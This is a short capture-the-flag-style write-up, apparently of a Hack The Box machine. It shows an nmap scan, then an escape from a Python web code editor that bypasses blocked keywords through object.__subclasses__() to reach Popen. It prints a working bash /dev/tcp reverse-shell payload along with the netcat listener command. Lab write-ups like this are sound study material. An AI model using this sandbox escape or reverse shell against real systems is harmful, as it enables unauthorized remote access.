```
──(kali㉿kali)-[~]
└─$ nmap -sV 10.10.11.62             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 06:29 EDT
Nmap scan report for 10.10.11.62
Host is up (0.64s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Gunicorn 20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.30 seconds

```

- The port 5000 is open and running Gunicorn 20.0.4
- visiting the website gives a code editor
- some of the keywords are restricted,  like import, os, subprocess this prevent from accessing the shell.
- there are option to run and save the codes.
- Now i some how have to see all the available subclasses of object i can use.
- `print([1,2,3].__class__)` gives me the class of the list in python
- if i can some how use popen which is used to execute commands in a new process.
- i can't use the import so i have to use it the hard way.
- `print((()).__class__.__bases__[0].__subclasses__())`. The bases give a tuple which contain class object. subclasses function of object gives me all the available subclasses i can use.
- This results in a tuple i have to find the index of popen from this. The output can not be completely seen in the editor so  i intercepted the request and copied all to the terminal. finding the index of subprocess popen was easy by using the Ctrl + F in a text editor.
- Using this popen we can get a reverse shell : `nc -lvnp 4444`
- First start a netcat listner: 
```
print([].__class__.__bases__[0].__subclasses__()[317](
    "bash -c 'bash -i >& /dev/tcp/10.10.16.86/4444 0>&1'", shell=True, stdout=-1).communicate())
```
- With that i got a reverse shell!. But it took me a lot of research especially in python sandbox escape.